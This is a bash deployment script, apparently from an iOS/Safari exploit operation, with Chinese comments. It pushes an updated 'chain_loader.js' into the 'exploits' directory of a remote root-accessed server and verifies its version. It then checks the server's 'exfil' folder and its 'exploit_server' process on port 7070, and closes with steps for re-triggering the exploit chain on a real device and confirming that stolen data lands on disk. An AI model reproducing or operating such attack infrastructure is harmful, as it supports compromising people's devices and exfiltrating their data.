#!/bin/bash
# DEPLOY_CHAINLOADER_FIX.sh
# 把本地最新 chain_loader.js (含 _earlySoftFallback IIFE) 推到服务器,
# 验证版本特征字符串, 强制 Safari 刷新.
#
# 用法: bash DEPLOY_CHAINLOADER_FIX.sh
# 或:   scp 到服务器再 bash ./DEPLOY_CHAINLOADER_FIX.sh

set -e

SERVER_ROOT="/www/wwwroot/coruna/server"
LOCAL_FILE="chain_loader.js"
REMOTE_FILE="${SERVER_ROOT}/exploits/chain_loader.js"

echo "=== DEPLOY_CHAINLOADER_FIX.sh ==="
echo "[1/5] 本地文件特征检查"
if [ ! -f "$LOCAL_FILE" ]; then
    echo "  ✗ 找不到本地 $LOCAL_FILE — 请在 server/exploits/ 目录下运行本脚本"
    exit 1
fi
GREP_HITS=$(grep -c '_earlySoftFallback\|_injectFallbackBridge' "$LOCAL_FILE" || true)
echo "  本地 chain_loader.js 含 _earlySoftFallback 标记数: $GREP_HITS"
if [ "$GREP_HITS" -lt 2 ]; then
    echo "  ✗ 本地 chain_loader.js 也不是最新版本, 请确认 d:\\soft\\ios-hacker\\744-coruna\\server\\exploits\\chain_loader.js 是否含顶部 IIFE"
    exit 1
fi
echo "  ✓ 本地版本包含 SOFT-FALLBACK 修复"

echo "[2/5] 上传到服务器"
# 1) 优先 scp; 2) 失败用 sftp heredoc
if command -v scp >/dev/null 2>&1; then
    scp -P 22 "$LOCAL_FILE" "root@aa1234.dpdns.org:${REMOTE_FILE}" && echo "  ✓ scp 成功" || echo "  ! scp 失败, 尝试 sftp"
fi
if [ ! -f "/tmp/_chain_loader_deployed" ]; then
    echo "  → 通过 sftp 上传..."
    sftp -P 22 root@aa1234.dpdns.org <<EOF
cd ${SERVER_ROOT}/exploits/
put ${LOCAL_FILE} chain_loader.js
bye
EOF
fi

echo "[3/5] 服务器端版本验证"
REMOTE_HITS=$(ssh -p 22 root@aa1234.dpdns.org "grep -c '_earlySoftFallback\|_injectFallbackBridge' ${REMOTE_FILE}" 2>/dev/null || echo "0")
echo "  服务器 chain_loader.js 含 _earlySoftFallback 标记数: $REMOTE_HITS"
if [ "$REMOTE_HITS" -lt 2 ]; then
    echo "  ✗ 服务器版本不匹配, 部署失败"
    exit 1
fi
echo "  ✓ 服务器版本与本地一致"

echo "[4/5] 服务器端 exfil 目录状态"
ssh -p 22 root@aa1234.dpdns.org "ls -lt ${SERVER_ROOT}/exfil/ | head -15"
echo "  ---"
echo "  最近 exfil 文件数: $(ssh -p 22 root@aa1234.dpdns.org "ls ${SERVER_ROOT}/exfil/ 2>/dev/null | wc -l")"

echo "[5/5] 检查 exploit_server 进程"
ssh -p 22 root@aa1234.dpdns.org "ps -ef | grep exploit_server | grep -v grep | head -5"
echo "  ---"
echo "  端口 7070 状态:"
ssh -p 22 root@aa1234.dpdns.org "ss -tlnp 2>/dev/null | grep ':7070' || netstat -tlnp 2>/dev/null | grep ':7070' || echo '  (端口探测失败, 但服务可能正常)'"

echo ""
echo "=== 部署完成 ==="
echo ""
echo "下一步真机验证步骤:"
echo "  1. 在 Safari 强制刷新 group.html 页面 (Cmd+Shift+R / 设置→清除历史与网站数据)"
echo "  2. 重新触发 exploit 链"
echo "  3. 观察 console log, 应该看到:"
echo "     [CHAIN] SOFT-FALLBACK bridge IMMEDIATELY injected (locked via defineProperty). window.nativeBridge = {...}"
echo "  4. 后台 dispatch 一条 ds_info, 验证命令正常完成 + exfil 落盘"
echo "  5. dashboard 上点 exfil 文件下载, 验证不再 'File not found on disk'"
